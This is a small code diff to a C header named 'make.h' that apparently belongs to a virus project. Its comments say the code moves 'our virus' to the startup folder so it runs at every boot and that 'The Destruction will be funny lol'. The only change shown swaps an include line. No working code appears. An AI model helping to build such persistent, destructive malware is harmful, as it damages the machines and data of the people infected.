@@ -1,7 +1,7 @@
 //This is make.h
 /*Basically, this moves our virus to startup folder so that it gets executed at every startup*/
 
-#include "handler.h"
+#include <stdlib.h>//#include handler caused conflict cos it was including itself
 
 //The Destruction will be funny lol
 
